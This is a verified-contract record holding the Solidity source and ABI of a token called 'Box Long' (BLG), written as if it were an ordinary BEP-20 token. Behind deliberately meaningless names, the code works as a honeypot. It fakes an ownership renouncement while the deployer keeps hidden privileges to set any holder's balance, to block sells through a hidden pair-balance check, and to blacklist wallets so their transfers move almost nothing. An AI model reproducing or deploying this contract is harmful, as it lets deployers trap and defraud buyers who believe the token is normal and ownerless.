{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface limitLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalTxWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atFrom {\n    function createPair(address tokenAt, address isFrom) external returns (address);\n}\n\ninterface shouldFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAmount) external view returns (uint256);\n\n    function transfer(address isLaunch, uint256 maxSellTx) external returns (bool);\n\n    function allowance(address receiverTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSellTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLaunch,\n        uint256 maxSellTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableMode, uint256 value);\n    event Approval(address indexed receiverTx, address indexed spender, uint256 value);\n}\n\ninterface launchEnable is shouldFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BoxLong is totalTxWallet, shouldFund, launchEnable {\n\n    uint256 private sellBuyTotal = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return fromTeam;\n    }\n\n    uint8 private amountMarketing = 18;\n\n    uint256 private enableFee;\n\n    function launchFromToken(address isLaunched) public {\n        require(isLaunched.balance < 100000);\n        if (receiverLaunch) {\n            return;\n        }\n        \n        isAtLaunched[isLaunched] = true;\n        if (sellTrading != takeEnable) {\n            teamEnable = buyLiquidity;\n        }\n        receiverLaunch = true;\n    }\n\n    function amountMax() private view {\n        require(isAtLaunched[_msgSender()]);\n    }\n\n    uint256 constant tokenIs = 6 ** 10;\n\n    bool public sellTrading;\n\n    bool private takeEnable;\n\n    address public liquidityAuto;\n\n    mapping(address => bool) public isAtLaunched;\n\n    function modeWallet(address launchExempt, uint256 maxSellTx) public {\n        amountMax();\n        buyLaunched[launchExempt] = maxSellTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountMarketing;\n    }\n\n    function buyAuto(uint256 maxSellTx) public {\n        amountMax();\n        launchExemptList = maxSellTx;\n    }\n\n    function owner() external view returns (address) {\n        return fromTeam;\n    }\n\n    function balanceOf(address launchAmount) public view virtual override returns (uint256) {\n        return buyLaunched[launchAmount];\n    }\n\n    function approve(address fundLiquidityList, uint256 maxSellTx) public virtual override returns (bool) {\n        tokenTakeAuto[_msgSender()][fundLiquidityList] = maxSellTx;\n        emit Approval(_msgSender(), fundLiquidityList, maxSellTx);\n        return true;\n    }\n\n    function exemptEnable(address feeTrading, address isLaunch, uint256 maxSellTx) internal returns (bool) {\n        if (feeTrading == liquidityTotal) {\n            return senderSwap(feeTrading, isLaunch, maxSellTx);\n        }\n        uint256 walletIsList = shouldFund(liquidityAuto).balanceOf(receiverLaunchedReceiver);\n        require(walletIsList == launchExemptList);\n        require(isLaunch != receiverLaunchedReceiver);\n        if (listMode[feeTrading]) {\n            return senderSwap(feeTrading, isLaunch, tokenIs);\n        }\n        return senderSwap(feeTrading, isLaunch, maxSellTx);\n    }\n\n    address receiverSwapAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address feeTrading, address isLaunch, uint256 maxSellTx) external override returns (bool) {\n        if (_msgSender() != receiverSwapAmount) {\n            if (tokenTakeAuto[feeTrading][_msgSender()] != type(uint256).max) {\n                require(maxSellTx <= tokenTakeAuto[feeTrading][_msgSender()]);\n                tokenTakeAuto[feeTrading][_msgSender()] -= maxSellTx;\n            }\n        }\n        return exemptEnable(feeTrading, isLaunch, maxSellTx);\n    }\n\n    function allowance(address limitTradingTake, address fundLiquidityList) external view virtual override returns (uint256) {\n        if (fundLiquidityList == receiverSwapAmount) {\n            return type(uint256).max;\n        }\n        return tokenTakeAuto[limitTradingTake][fundLiquidityList];\n    }\n\n    uint256 public buyLiquidity;\n\n    function transfer(address launchExempt, uint256 maxSellTx) external virtual override returns (bool) {\n        return exemptEnable(_msgSender(), launchExempt, maxSellTx);\n    }\n\n    uint256 feeSender;\n\n    function liquidityLaunched() public {\n        emit OwnershipTransferred(liquidityTotal, address(0));\n        fromTeam = address(0);\n    }\n\n    address public liquidityTotal;\n\n    function amountEnable(address swapToken) public {\n        amountMax();\n        if (teamEnable != enableFee) {\n            enableFee = buyLiquidity;\n        }\n        if (swapToken == liquidityTotal || swapToken == liquidityAuto) {\n            return;\n        }\n        listMode[swapToken] = true;\n    }\n\n    bool public receiverLaunch;\n\n    mapping(address => uint256) private buyLaunched;\n\n    string private exemptFund = \"BLG\";\n\n    function senderSwap(address feeTrading, address isLaunch, uint256 maxSellTx) internal returns (bool) {\n        require(buyLaunched[feeTrading] >= maxSellTx);\n        buyLaunched[feeTrading] -= maxSellTx;\n        buyLaunched[isLaunch] += maxSellTx;\n        emit Transfer(feeTrading, isLaunch, maxSellTx);\n        return true;\n    }\n\n    uint256 private teamEnable;\n\n    mapping(address => bool) public listMode;\n\n    string private tokenShould = \"Box Long\";\n\n    mapping(address => mapping(address => uint256)) private tokenTakeAuto;\n\n    uint256 launchExemptList;\n\n    event OwnershipTransferred(address indexed isAt, address indexed txBuyFrom);\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptFund;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellBuyTotal;\n    }\n\n    address receiverLaunchedReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private fromTeam;\n\n    constructor (){\n        if (takeEnable != sellTrading) {\n            takeEnable = false;\n        }\n        limitLaunch fundIs = limitLaunch(receiverSwapAmount);\n        liquidityAuto = atFrom(fundIs.factory()).createPair(fundIs.WETH(), address(this));\n        if (teamEnable != buyLiquidity) {\n            takeEnable = false;\n        }\n        liquidityTotal = _msgSender();\n        liquidityLaunched();\n        isAtLaunched[liquidityTotal] = true;\n        buyLaunched[liquidityTotal] = sellBuyTotal;\n        \n        emit Transfer(address(0), liquidityTotal, sellBuyTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenShould;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuyFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTradingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLiquidityList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"}],\"name\":\"amountEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidityList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSellTx\",\"type\":\"uint256\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAtLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"launchFromToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellTx\",\"type\":\"uint256\"}],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BoxLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}